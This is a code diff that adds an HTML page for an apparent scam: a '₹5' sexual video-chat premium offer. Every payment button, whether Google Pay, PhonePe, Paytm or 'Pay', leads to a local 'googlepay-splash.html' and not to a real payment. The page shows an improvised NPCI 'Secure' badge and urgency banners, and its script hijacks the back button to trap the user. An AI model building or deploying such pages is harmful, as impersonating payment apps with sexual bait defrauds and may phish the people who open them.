@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Sexy Chat – Unlock Premium</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow-x: hidden;
+      position: fixed;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+    
+    .container {
+      background: #fff;
+      border-radius: 20px;
+      padding: 20px 18px;
+      width: 88%;
+      max-width: 340px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      position: relative;
+      margin: 15px auto;
+      box-sizing: border-box;
+    }
+    
+    .premium-badge {
+      position: absolute;
+      top: -4px;
+      right: -4px;
+      background: linear-gradient(135deg, #ffd700, #ffed4e);
+      color: #333;
+      padding: 5px 14px;
+      border-radius: 0 20px 0 16px;
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    
+    .header {
+      background: linear-gradient(135deg, #28a745, #20c997);
+      color: #fff;
+      padding: 14px;
+      border-radius: 14px;
+      margin-bottom: 14px;
+      box-shadow: 0 6px 15px rgba(40, 167, 69, 0.3);
+    }
+    
+    .price {
+      font-size: clamp(28px, 8vw, 36px);
+      font-weight: 800;
+      margin-bottom: 3px;
+    }
+    
+    .price-label {
+      font-size: 11px;
+      opacity: 0.9;
+      font-weight: 500;
+    }
+    
+    .offer-msg {
+      background: linear-gradient(135deg, #ffe6e6, #fff0f0);
+      padding: 12px;
+      border-radius: 12px;
+      border-left: 3px solid #d32f2f;
+      color: #c62828;
+      font-size: 12px;
+      line-height: 1.5;
+      margin-bottom: 14px;
+    }
+    
+    .offer-msg strong {
+      font-weight: 700;
+      display: block;
+      margin-bottom: 3px;
+      font-size: 13px;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .features-list {
+      text-align: left;
+      margin: 14px 0;
+      background: linear-gradient(135deg, #f8f9ff, #fff);
+      padding: 14px;
+      border-radius: 12px;
+    }
+    
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 12px;
+      color: #333;
+    }
+    
+    .feature-item:last-child {
+      margin-bottom: 0;
+    }
+    
+    .feature-icon {
+      width: 24px;
+      height: 24px;
+      background: linear-gradient(135deg, #9c27b0, #e91e63);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+    
+    .payment-section {
+      margin: 16px 0 14px;
+    }
+    
+    .section-title {
+      font-weight: 600;
+      font-size: 13px;
+      margin-bottom: 12px;
+      color: #333;
+    }
+    
+    .pay-options {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+    
+    .pay-option {
+      width: 55px;
+      height: 55px;
+      background: #fff;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
+    }
+    
+    .pay-option svg {
+      width: 35px;
+      height: 35px;
+    }
+    
+    .pay-btn {
+      background: linear-gradient(135deg, #9c27b0, #e91e63);
+      color: #fff;
+      border: none;
+      padding: 13px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(156, 39, 176, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .secure {
+      margin-top: 14px;
+      padding: 8px;
+      background: linear-gradient(135deg, #e8f5e9, #f1f8e9);
+      border-radius: 10px;
+      font-size: 11px;
+      color: #2e7d32;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-weight: 600;
+    }
+    
+    .secure svg {
+      height: 18px;
+      width: 50px;
+    }
+    
+    .timer {
+      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
+      color: #fff;
+      padding: 8px;
+      border-radius: 10px;
+      font-size: 11px;
+      font-weight: 600;
+      margin-top: 12px;
+    }
+    
+    .warning-box {
+      background: linear-gradient(135deg, #fff3cd, #ffeaa7);
+      border: 2px solid #ffc107;
+      color: #856404;
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-top: 12px;
+      line-height: 1.5;
+      text-align: left;
+    }
+    
+    .warning-box strong {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="premium-badge">⭐ Premium</div>
+    
+    <div class="header">
+      <div class="price">₹5 Only</div>
+      <div class="price-label">One-Time Payment</div>
+    </div>
+    
+    <div class="offer-msg">
+      <strong>🔥 Unlock Premium! 💋</strong>
+      Pay ₹5 for private 1-on-1 video calls with hot girls! 😘
+    </div>
+    
+    <div class="features-list">
+      <div class="feature-item">
+        <div class="feature-icon">💖</div>
+        <div>Unlimited video calls</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">🔒</div>
+        <div>100% Private & Secure</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">⚡</div>
+        <div>Instant activation</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">🎁</div>
+        <div>Exclusive content</div>
+      </div>
+    </div>
+    
+    <div class="payment-section">
+      <div class="section-title">Select Payment</div>
+      
+      <div class="pay-options">
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- Google Pay Logo -->
+          <img src="google-pay-icon.png" alt="Google Pay" style="width: 100%; height: auto; object-fit: contain;">
+        </div>
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- PhonePe Logo -->
+          <img src="phonepe-icon.png" alt="PhonePe" style="width: 100%; height: auto; object-fit: contain;">
+        </div>
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- Paytm Logo -->
+          <img src="paytm-icon.png" alt="Paytm" style="width: 100%; height: auto; object-fit: contain;">
+        </div>
+      </div>
+      
+      <button class="pay-btn" onclick="goToSplash()">💳 Pay ₹5</button>
+    </div>
+    
+    <div class="secure">
+      <span>🔐 Secure</span>
+      <!-- NPCI Logo -->
+      <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+        <rect width="100" height="30" rx="4" fill="#FF6B35"/>
+        <text x="50" y="20" font-family="Arial" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">NPCI</text>
+      </svg>
+    </div>
+    
+    <div class="timer">⏰ Limited Offer - Activate Now!</div>
+    
+    <div class="warning-box">
+      <strong>⚠️ IMPORTANT:</strong>
+      After payment, please DO NOT close the app or press back button. Wait for the verification process to complete (takes 3-5 seconds). Your access will be activated automatically!
+    </div>
+  </div>
+
+  <script>
+    // Disable back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
+    function goToSplash() {
+      window.location.href = 'googlepay-splash.html';
+    }
+  </script>
+</body>
+</html>
